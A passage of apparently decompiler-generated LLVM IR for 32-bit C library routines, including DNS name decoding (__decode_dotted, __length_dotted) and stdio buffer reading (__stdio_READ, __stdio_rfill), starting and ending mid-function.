  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 11, 12, 13, 3, 4, 5, 6, 7, 14, 15 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25 }
  uselistorder label %dec_label_pc_805882c, { 1, 0 }
  uselistorder label %dec_label_pc_8058829, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058815, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8058810, { 1, 0 }
  uselistorder label %dec_label_pc_80587da, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8058836 = load i32, i32* @esi, align 4
  %v4_805883b = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_805883b, label %dec_label_pc_8058902, label %dec_label_pc_805884a

dec_label_pc_805884a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80588ea2541 = add i32 %arg2, %arg1
  %v3_80588ea2642 = inttoptr i32 %v2_80588ea2541 to i8*
  %v4_80588ea2743 = load i8, i8* %v3_80588ea2642, align 1
  %v1_80588ee2945 = icmp eq i8 %v4_80588ea2743, 0
  %v1_80588f03046 = icmp eq i1 %v1_80588ee2945, false
  br i1 %v1_80588f03046, label %dec_label_pc_8058858.lr.ph, label %dec_label_pc_80588f6

dec_label_pc_8058858:                             ; preds = %dec_label_pc_8058858.lr.ph, %dec_label_pc_8058871
  %v0_8058862 = phi i32 [ %v0_8058862.pre, %dec_label_pc_8058858.lr.ph ], [ %v4_8058882, %dec_label_pc_8058871 ]
  %v8_805885837 = phi i1 [ %v8_80588583151, %dec_label_pc_8058858.lr.ph ], [ true, %dec_label_pc_8058871 ]
  %v5_80588ea36.in = phi i8 [ %v5_80588ea2850.in, %dec_label_pc_8058858.lr.ph ], [ %v4_80588ea, %dec_label_pc_8058871 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8058858.lr.ph ], [ 0, %dec_label_pc_8058871 ]
  %v0_805885f34 = phi i32 [ %v0_805885f.ph47, %dec_label_pc_8058858.lr.ph ], [ %v2_8058890, %dec_label_pc_8058871 ]
  %v5_80588ea36 = zext i8 %v5_80588ea36.in to i32
  %v1_805885f = add i32 %v0_805885f34, 1
  store i32 %v1_805885f, i32* @esi, align 4
  %v3_8058862 = select i1 %v8_805885837, i32 2, i32 1
  %v4_8058862 = add i32 %v3_8058862, %v0_8058862
  store i32 %v4_8058862, i32* %ebp.global-to-local, align 4
  %v1_8058865 = and i32 %v5_80588ea36, 192
  %v6_805886a = icmp eq i32 %v1_8058865, 192
  %v1_805886f = icmp eq i1 %v6_805886a, false
  br i1 %v1_805886f, label %dec_label_pc_8058894, label %dec_label_pc_8058871

dec_label_pc_8058871:                             ; preds = %dec_label_pc_8058858
  %v2_805887e = add i32 %v1_805885f, %arg1
  %v3_805887e = inttoptr i32 %v2_805887e to i8*
  %v4_805887e = load i8, i8* %v3_805887e, align 1
  %v5_805887e = zext i8 %v4_805887e to i32
  %v4_8058882 = add i32 %v3_8058862, %v4_8058862
  store i32 %v4_8058882, i32* %ebp.global-to-local, align 4
  %v1_8058885 = mul nuw nsw i32 %v5_80588ea36, 256
  %v2_8058888 = and i32 %v1_8058885, 16128
  %v2_8058890 = or i32 %v5_805887e, %v2_8058888
  store i32 %v2_8058890, i32* @edx, align 4
  store i32 %v1_80588b1.ph48, i32* @ecx, align 4
  %v2_80588ea = add i32 %v2_8058890, %arg1
  %v3_80588ea = inttoptr i32 %v2_80588ea to i8*
  %v4_80588ea = load i8, i8* %v3_80588ea, align 1
  %v1_80588ee = icmp eq i8 %v4_80588ea, 0
  %v1_80588f0 = icmp eq i1 %v1_80588ee, false
  br i1 %v1_80588f0, label %dec_label_pc_8058858, label %dec_label_pc_80588f6

dec_label_pc_8058894:                             ; preds = %dec_label_pc_8058858
  %v2_8058894 = add i32 %v5_80588ea36, %v1_80588b1.ph48
  %v1_8058899 = add i32 %v2_8058894, 1
  store i32 %v1_8058899, i32* @edi, align 4
  %v10_805889a = icmp ult i32 %v1_8058899, %arg4
  %v1_80588a2 = icmp eq i1 %v10_805889a, false
  br i1 %v1_80588a2, label %dec_label_pc_8058902, label %dec_label_pc_80588a4

dec_label_pc_80588a4:                             ; preds = %dec_label_pc_8058894
  %v2_80588aa = add i32 %v1_805885f, %arg1
  %v2_80588b1 = add i32 %v1_80588b1.ph48, %arg3
  %v3_80588b4 = inttoptr i32 %v2_80588b1 to i16*
  %v4_80588b4 = call i32 @memcpy(i16* %v3_80588b4, i32 %v2_80588aa, i32 %v5_80588ea36)
  %v0_80588c0 = load i32, i32* %ebp.global-to-local, align 4
  %v0_80588c9 = load i32, i32* @esi, align 4
  %v2_80588c9 = add i32 %v0_80588c9, %v5_80588ea36
  store i32 %v2_80588c9, i32* @edx, align 4
  %v1_80588d0 = icmp eq i1 %v8_805885837, false
  %v2_80588c0 = select i1 %v1_80588d0, i32 %v5_80588ea36, i32 0
  %v4_80588d0 = add i32 %v0_80588c0, %v2_80588c0
  store i32 %v4_80588d0, i32* %ebp.global-to-local, align 4
  %v4_80588e1 = add i32 %v2_8058894, %arg3
  %v5_80588e1 = inttoptr i32 %v4_80588e1 to i8*
  store i8 46, i8* %v5_80588e1, align 1
  %v0_80588e4.pre = load i32, i32* @edi, align 4
  %v1_80588ea.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80588e4.pre, i32* @ecx, align 4
  %v2_80588ea25 = add i32 %v1_80588ea.pre.pre, %arg1
  %v3_80588ea26 = inttoptr i32 %v2_80588ea25 to i8*
  %v4_80588ea27 = load i8, i8* %v3_80588ea26, align 1
  %v1_80588ee29 = icmp eq i8 %v4_80588ea27, 0
  %v1_80588f030 = icmp eq i1 %v1_80588ee29, false
  %v8_805885831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8058862.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80588f030, label %dec_label_pc_8058858.lr.ph, label %dec_label_pc_80588f6

dec_label_pc_8058858.lr.ph:                       ; preds = %dec_label_pc_80588a4, %dec_label_pc_805884a
  %v0_8058862.pre = phi i32 [ 0, %dec_label_pc_805884a ], [ %v0_8058862.pre.pre, %dec_label_pc_80588a4 ]
  %v8_80588583151 = phi i1 [ false, %dec_label_pc_805884a ], [ %v8_805885831, %dec_label_pc_80588a4 ]
  %v5_80588ea2850.in = phi i8 [ %v4_80588ea2743, %dec_label_pc_805884a ], [ %v4_80588ea27, %dec_label_pc_80588a4 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_805884a ], [ %stack_var_-17.135, %dec_label_pc_80588a4 ]
  %v1_80588b1.ph48 = phi i32 [ 0, %dec_label_pc_805884a ], [ %v0_80588e4.pre, %dec_label_pc_80588a4 ]
  %v0_805885f.ph47 = phi i32 [ %arg2, %dec_label_pc_805884a ], [ %v1_80588ea.pre.pre, %dec_label_pc_80588a4 ]
  br label %dec_label_pc_8058858

dec_label_pc_80588f6:                             ; preds = %dec_label_pc_80588a4, %dec_label_pc_8058871, %dec_label_pc_805884a
  %v0_80588fb = phi i32 [ 0, %dec_label_pc_805884a ], [ %v4_8058882, %dec_label_pc_8058871 ], [ %v0_8058862.pre.pre, %dec_label_pc_80588a4 ]
  %v8_8058858.lcssa = phi i1 [ false, %dec_label_pc_805884a ], [ true, %dec_label_pc_8058871 ], [ %v8_805885831, %dec_label_pc_80588a4 ]
  %v2_80588fd = zext i1 %v8_8058858.lcssa to i32
  %v3_80588fd = add i32 %v0_80588fb, 1
  %v4_80588fd = add i32 %v3_80588fd, %v2_80588fd
  br label %dec_label_pc_8058905

dec_label_pc_8058902:                             ; preds = %dec_label_pc_8058894, %entry
  br label %dec_label_pc_8058905

dec_label_pc_8058905:                             ; preds = %dec_label_pc_80588f6, %dec_label_pc_8058902
  %storemerge = phi i32 [ %v4_80588fd, %dec_label_pc_80588f6 ], [ -1, %dec_label_pc_8058902 ]
  store i32 %v0_8058836, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80588b1.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_80588ea, { 1, 0 }
  uselistorder i32 %v2_8058890, { 0, 2, 1 }
  uselistorder i32 %v4_8058882, { 0, 2, 1 }
  uselistorder i32 %v5_80588ea36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 1, 32, 35, 6, 0, 34, 33, 27, 2, 28, 3, 29, 30, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 4, 5, 31, 26 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 4, 5, 6, 7, 8, 9, 10, 17, 11, 12, 18, 20, 21, 16, 13, 14, 15, 19, 0, 1, 2, 3 }
  uselistorder i32* @edi, { 3, 132, 133, 20, 134, 135, 136, 19, 137, 138, 139, 2, 0, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 28, 5, 4, 29, 30, 31, 32, 33, 36, 34, 35, 155, 7, 156, 8, 157, 158, 6, 159, 160, 161, 162, 167, 168, 1, 163, 164, 165, 166, 169, 170, 171, 172, 9, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 10, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 88, 89, 90, 91, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 11, 228, 229, 230, 231, 232, 233, 234, 328, 329, 330, 12, 331, 332, 335, 336, 285, 286, 287, 337, 338, 339, 354, 105, 13, 106, 107, 108, 37, 38, 39, 40, 41, 42, 43, 113, 114, 115, 116, 117, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 14, 318, 319, 320, 321, 322, 264, 265, 15, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 235, 236, 16, 237, 352, 353, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 17, 262, 25, 26, 27, 248, 18, 249, 250, 263, 348, 349, 350, 351, 109, 110, 111, 112, 333, 334, 118, 119, 283, 284, 44, 45, 46, 288, 289, 345, 346, 347, 290, 291, 47, 48, 49, 340, 341, 342, 343, 344, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 21, 22, 23, 24, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 278, 279, 280, 281, 282, 292, 293, 294, 323, 324, 325, 326, 327 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 10, 46, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 47, 22, 23, 24, 45, 25, 26, 27, 28, 0, 1, 29, 2, 48, 30, 31, 52, 32, 33, 4, 50, 51, 3, 34, 35, 36, 37, 38, 39, 40, 41, 42, 49, 53, 43, 44 }
  uselistorder i1 true, { 2, 3, 7, 8, 9, 10, 11, 12, 5, 6, 0, 4, 1 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8058905, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805891e = icmp eq i32 %arg1, 0
  br i1 %v1_805891e, label %dec_label_pc_805894d, label %dec_label_pc_805893e.preheader

dec_label_pc_805893e.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805893e10 = add i32 %arg2, %arg1
  %v3_805893e11 = inttoptr i32 %v2_805893e10 to i8*
  %v4_805893e12 = load i8, i8* %v3_805893e11, align 1
  %v1_805894214 = add i32 %arg2, 1
  %v1_805894515 = icmp eq i8 %v4_805893e12, 0
  %v1_805894716 = icmp eq i1 %v1_805894515, false
  br i1 %v1_805894716, label %dec_label_pc_805892d, label %dec_label_pc_8058949

dec_label_pc_8058924:                             ; preds = %dec_label_pc_805892d
  %v1_8058924 = add i32 %v0_805892417, 2
  br label %dec_label_pc_8058949

dec_label_pc_805892d:                             ; preds = %dec_label_pc_805893e.preheader, %dec_label_pc_805893e
  %v1_805894219 = phi i32 [ %v1_8058942, %dec_label_pc_805893e ], [ %v1_805894214, %dec_label_pc_805893e.preheader ]
  %v5_805893e18.in = phi i8 [ %v4_805893e, %dec_label_pc_805893e ], [ %v4_805893e12, %dec_label_pc_805893e.preheader ]
  %v0_805892417 = phi i32 [ %v2_805893b, %dec_label_pc_805893e ], [ %arg2, %dec_label_pc_805893e.preheader ]
  %v5_805893e18 = zext i8 %v5_805893e18.in to i32
  %v1_805892f = and i32 %v5_805893e18, 192
  %v6_8058934 = icmp eq i32 %v1_805892f, 192
  %v2_805893b = add i32 %v5_805893e18, %v1_805894219
  br i1 %v6_8058934, label %dec_label_pc_8058924, label %dec_label_pc_805893e

dec_label_pc_805893e:                             ; preds = %dec_label_pc_805892d
  store i32 %v2_805893b, i32* @ecx, align 4
  %v2_805893e = add i32 %v2_805893b, %arg1
  %v3_805893e = inttoptr i32 %v2_805893e to i8*
  %v4_805893e = load i8, i8* %v3_805893e, align 1
  %v1_8058942 = add i32 %v2_805893b, 1
  %v1_8058945 = icmp eq i8 %v4_805893e, 0
  %v1_8058947 = icmp eq i1 %v1_8058945, false
  br i1 %v1_8058947, label %dec_label_pc_805892d, label %dec_label_pc_8058949

dec_label_pc_8058949:                             ; preds = %dec_label_pc_805893e.preheader, %dec_label_pc_805893e, %dec_label_pc_8058924
  %v0_8058949 = phi i32 [ %v1_8058924, %dec_label_pc_8058924 ], [ %v1_805894214, %dec_label_pc_805893e.preheader ], [ %v1_8058942, %dec_label_pc_805893e ]
  %v2_805894b = sub i32 %v0_8058949, %arg2
  br label %dec_label_pc_805894d

dec_label_pc_805894d:                             ; preds = %entry, %dec_label_pc_8058949
  %v0_8058950 = phi i32 [ -1, %entry ], [ %v2_805894b, %dec_label_pc_8058949 ]
  ret i32 %v0_8058950

; uselistorder directives
  uselistorder i8 %v4_805893e, { 1, 0 }
  uselistorder i32 %v2_805893b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 1, 3, 2, 4, 0 }
  uselistorder i32 2, { 152, 61, 153, 154, 155, 88, 157, 158, 58, 59, 60, 0, 1, 156, 159, 160, 161, 132, 162, 163, 164, 165, 166, 167, 137, 2, 138, 139, 65, 168, 169, 3, 89, 66, 4, 5, 170, 171, 172, 84, 173, 174, 175, 176, 133, 191, 192, 71, 177, 178, 85, 14, 15, 75, 76, 199, 72, 131, 13, 90, 128, 91, 129, 92, 130, 67, 16, 141, 63, 93, 94, 6, 95, 7, 96, 8, 97, 98, 17, 18, 77, 19, 20, 194, 21, 22, 86, 23, 185, 186, 187, 188, 9, 78, 146, 147, 189, 190, 68, 69, 70, 24, 200, 79, 179, 180, 74, 25, 26, 181, 27, 182, 28, 80, 183, 184, 29, 193, 198, 87, 140, 101, 99, 100, 102, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 10, 142, 41, 42, 43, 11, 143, 44, 45, 46, 47, 48, 144, 103, 49, 145, 104, 50, 81, 51, 52, 53, 54, 55, 56, 105, 106, 107, 108, 82, 109, 110, 111, 120, 73, 112, 113, 114, 115, 116, 119, 117, 118, 134, 135, 136, 121, 122, 148, 62, 149, 12, 150, 123, 64, 151, 124, 125, 126, 197, 83, 195, 57, 196, 127 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 0, 61, 62, 63, 64, 13, 65, 66, 67, 68, 14, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 37, 44, 38, 39, 40, 41, 42, 43, 85, 86, 8, 9, 50, 1, 51, 87, 88, 89, 11, 17, 90, 91, 15, 10, 16, 92, 93, 94, 95, 96, 97, 163, 164, 165, 166, 12, 52, 2, 53, 98, 99, 30, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 27, 126, 127, 128, 129, 28, 130, 24, 18, 45, 46, 47, 48, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 19, 191, 167, 168, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 20, 207, 208, 210, 211, 212, 213, 209, 216, 156, 157, 158, 159, 160, 161, 162, 31, 32, 131, 132, 133, 134, 135, 136, 137, 29, 138, 139, 140, 141, 142, 143, 21, 22, 3, 4, 144, 145, 23, 146, 147, 148, 149, 150, 152, 153, 154, 35, 36, 151, 155, 214, 215, 217, 218, 219, 33, 34, 49, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805894d, { 1, 0 }
  uselistorder label %dec_label_pc_8058949, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805892d, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058954 = load i32, i32* @ebx, align 4
  store i32 %v0_8058954, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805895a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805895a, i32* @ebx, align 4
  %v1_8058962 = bitcast i16* %arg1 to i8*
  %v2_8058962 = load i8, i8* %v1_8058962, align 1
  %v3_8058962 = and i8 %v2_8058962, 4
  %v4_8058962 = icmp eq i8 %v3_8058962, 0
  %v1_8058965 = icmp eq i1 %v4_8058962, false
  br i1 %v1_8058965, label %dec_label_pc_805899d, label %dec_label_pc_8058967

dec_label_pc_8058967:                             ; preds = %entry
  %v2_8058967 = icmp slt i32 %arg3, 0
  %v3_805896e = select i1 %v2_8058967, i32 2147483647, i32 %arg3
  %v1_8058977 = add i32 %v4_805895a, 4
  %v2_8058977 = inttoptr i32 %v1_8058977 to i32*
  %v3_8058977 = load i32, i32* %v2_8058977, align 4
  %v3_805897a = inttoptr i32 %arg2 to i32*
  %v4_805897a = call i32 @__libc_read(i32 %v3_8058977, i32* %v3_805897a, i32 %v3_805896e)
  store i32 %v4_805897a, i32* %ecx.global-to-local, align 4
  %tmp12 = icmp slt i32 %v4_805897a, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805899d, label %dec_label_pc_8058989

dec_label_pc_8058989:                             ; preds = %dec_label_pc_8058967
  %v1_8058982 = icmp eq i32 %v4_805897a, 0
  %v4_8058987 = icmp eq i1 %v1_8058982, false
  %v0_8058989 = load i32, i32* @ebx, align 4
  %v1_8058989 = inttoptr i32 %v0_8058989 to i32*
  %v2_8058989 = load i32, i32* %v1_8058989, align 4
  br i1 %v4_8058987, label %dec_label_pc_8058995, label %dec_label_pc_805898d

dec_label_pc_805898d:                             ; preds = %dec_label_pc_8058989
  %v1_805898d = or i32 %v2_8058989, 4
  %v1_8058990 = trunc i32 %v1_805898d to i16
  %v3_8058990 = inttoptr i32 %v0_8058989 to i16*
  store i16 %v1_8058990, i16* %v3_8058990, align 2
  br label %dec_label_pc_805899d

dec_label_pc_8058995:                             ; preds = %dec_label_pc_8058989
  %v1_8058995 = or i32 %v2_8058989, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805899a = trunc i32 %v1_8058995 to i16
  %v3_805899a = inttoptr i32 %v0_8058989 to i16*
  store i16 %v1_805899a, i16* %v3_805899a, align 2
  br label %dec_label_pc_805899d

dec_label_pc_805899d:                             ; preds = %dec_label_pc_8058967, %entry, %dec_label_pc_805898d, %dec_label_pc_8058995
  %v0_805899e = load i32, i32* %ecx.global-to-local, align 4
  %v2_80589a1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80589a1, i32* @ebx, align 4
  ret i32 %v0_805899e

; uselistorder directives
  uselistorder i32 %v4_805897a, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 4, { 246, 247, 248, 249, 71, 256, 257, 258, 252, 250, 251, 253, 254, 255, 0, 6, 259, 260, 261, 262, 263, 264, 265, 266, 267, 33, 53, 143, 144, 145, 34, 35, 36, 268, 48, 1, 199, 7, 8, 269, 270, 271, 272, 273, 54, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 60, 286, 287, 288, 289, 72, 37, 290, 291, 292, 293, 38, 39, 40, 73, 41, 42, 74, 43, 294, 44, 295, 75, 45, 76, 77, 9, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 55, 306, 387, 307, 388, 389, 395, 396, 401, 402, 403, 390, 49, 99, 216, 217, 391, 392, 393, 394, 10, 146, 147, 148, 149, 78, 220, 221, 222, 61, 239, 240, 241, 242, 150, 151, 152, 153, 154, 62, 11, 155, 156, 397, 399, 341, 342, 343, 344, 345, 346, 12, 347, 348, 349, 350, 351, 352, 353, 354, 339, 340, 355, 51, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 31, 376, 377, 52, 378, 13, 157, 398, 218, 219, 329, 330, 50, 331, 332, 333, 334, 2, 14, 3, 335, 63, 158, 64, 400, 15, 308, 16, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 46, 47, 100, 79, 326, 327, 328, 159, 160, 161, 17, 162, 18, 32, 19, 20, 163, 164, 21, 165, 80, 166, 81, 167, 168, 82, 169, 170, 83, 171, 172, 173, 84, 174, 175, 176, 177, 178, 95, 179, 180, 181, 182, 183, 184, 185, 56, 186, 187, 188, 189, 190, 96, 191, 192, 193, 194, 195, 196, 197, 57, 198, 200, 201, 202, 58, 203, 204, 205, 65, 66, 67, 206, 85, 86, 87, 88, 89, 68, 207, 90, 208, 69, 209, 210, 59, 211, 212, 213, 70, 214, 215, 91, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 97, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 223, 224, 225, 226, 227, 228, 229, 230, 231, 22, 23, 232, 233, 234, 235, 236, 237, 238, 4, 243, 24, 25, 244, 26, 92, 93, 98, 245, 94, 336, 337, 27, 5, 28, 29, 338, 30, 379, 380, 381, 382, 383, 384, 385, 386, 404, 405, 406, 142 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i8 0, { 133, 39, 4, 7, 8, 40, 6, 5, 134, 135, 136, 10, 142, 137, 138, 9, 140, 141, 139, 31, 143, 1, 2, 80, 81, 82, 144, 145, 34, 146, 11, 13, 113, 112, 12, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 16, 166, 162, 163, 161, 14, 164, 165, 15, 32, 167, 168, 169, 170, 171, 172, 173, 236, 237, 18, 115, 114, 17, 116, 117, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 3, 190, 191, 192, 258, 193, 261, 42, 59, 37, 38, 95, 19, 260, 242, 243, 244, 245, 246, 247, 248, 249, 43, 250, 228, 21, 125, 126, 20, 194, 195, 60, 29, 28, 0, 44, 45, 46, 196, 227, 231, 232, 197, 198, 199, 200, 201, 202, 203, 204, 205, 22, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 30, 219, 220, 221, 222, 223, 224, 225, 226, 78, 259, 124, 83, 84, 23, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 47, 109, 110, 111, 48, 118, 119, 120, 121, 122, 123, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 35, 127, 128, 129, 130, 131, 132, 229, 230, 233, 234, 235, 24, 238, 239, 36, 240, 33, 241, 251, 256, 255, 25, 252, 253, 27, 254, 26, 257, 79, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i8 4, { 5, 0, 6, 3, 4, 2, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805899d, { 3, 2, 0, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80589a4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80589ac = add i32 %arg1, 8
  %v2_80589ac = inttoptr i32 %v1_80589ac to i32*
  %v3_80589ac = load i32, i32* %v2_80589ac, align 4
  store i32 %v3_80589ac, i32* %edx.global-to-local, align 4
  %v1_80589af = add i32 %arg1, 12
  %v2_80589af = inttoptr i32 %v1_80589af to i32*
  %v3_80589af = load i32, i32* %v2_80589af, align 4
  %v2_80589b2 = sub i32 %v3_80589af, %v3_80589ac
  %v3_80589b7 = inttoptr i32 %arg1 to i16*
  %v4_80589b7 = call i32 @__stdio_READ(i16* %v3_80589b7, i32 %v3_80589ac, i32 %v2_80589b2)
  %v0_80589bc = load i32, i32* @ebx, align 4
  %v1_80589bc = add i32 %v0_80589bc, 8
  %v2_80589bc = inttoptr i32 %v1_80589bc to i32*
  %v3_80589bc = load i32, i32* %v2_80589bc, align 4
  store i32 %v3_80589bc, i32* %edx.global-to-local, align 4
  %v2_80589bf = add i32 %v0_80589bc, 16
  %v3_80589bf = inttoptr i32 %v2_80589bf to i32*
  store i32 %v3_80589bc, i32* %v3_80589bf, align 4
  %v0_80589c2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80589c2 = add i32 %v0_80589c2, %v4_80589b7
  store i32 %v2_80589c2, i32* %edx.global-to-local, align 4
  %v1_80589c4 = load i32, i32* @ebx, align 4
  %v2_80589c4 = add i32 %v1_80589c4, 20
  %v3_80589c4 = inttoptr i32 %v2_80589c4 to i32*
  store i32 %v2_80589c2, i32* %v3_80589c4, align 4
  store i32 %v0_80589a4, i32* @ebx, align 4
  ret i32 %v4_80589b7

; uselistorder directives
  uselistorder i32 %v4_80589b7, { 1, 0 }
  uselistorder i32 20, { 21, 22, 23, 24, 25, 26, 27, 2, 28, 29, 4, 30, 3, 31, 32, 1, 7, 8, 19, 9, 33, 34, 35, 36, 37, 5, 38, 39, 40, 10, 11, 12, 13, 14, 15, 16, 17, 18, 6, 20, 0 }
  uselistorder i32 16, { 68, 69, 70, 71, 72, 74, 73, 0, 75, 76, 11, 6, 77, 12, 78, 79, 80, 10, 7, 81, 82, 83, 84, 85, 86, 87, 88, 95, 89, 90, 91, 92, 93, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 138, 13, 14, 28, 18, 41, 29, 39, 61, 40, 142, 136, 2, 1, 137, 4, 3, 133, 134, 15, 143, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 19, 129, 130, 131, 132, 139, 140, 141, 27, 20, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 21, 56, 57, 58, 16, 22, 59, 23, 60, 17, 30, 31, 32, 33, 34, 35, 36, 37, 38, 62, 63, 9, 64, 65, 66, 67, 5, 24, 135, 8, 25, 26 }
  uselistorder i32 12, { 72, 73, 74, 75, 76, 0, 77, 17, 40, 1, 78, 79, 99, 24, 22, 7, 23, 8, 9, 10, 11, 12, 13, 14, 80, 81, 82, 83, 84, 85, 86, 87, 2, 18, 19, 88, 89, 90, 133, 27, 41, 65, 71, 42, 43, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 25, 132, 95, 96, 97, 98, 134, 91, 3, 4, 92, 93, 15, 16, 94, 5, 26, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 20, 60, 61, 21, 62, 63, 64, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 66, 67, 68, 69, 70, 6 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80589cc = load i32, i32* @ebx, align 4
  %v4_80589d0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80589d0, i32* @ebx, align 4
  %v2_80589d8 = load i16, i16* %arg1, align 2
  %v3_80589d8 = zext i16 %v2_80589d8 to i32
  %v2_80589db = and i32 %v3_80589d8, %arg2
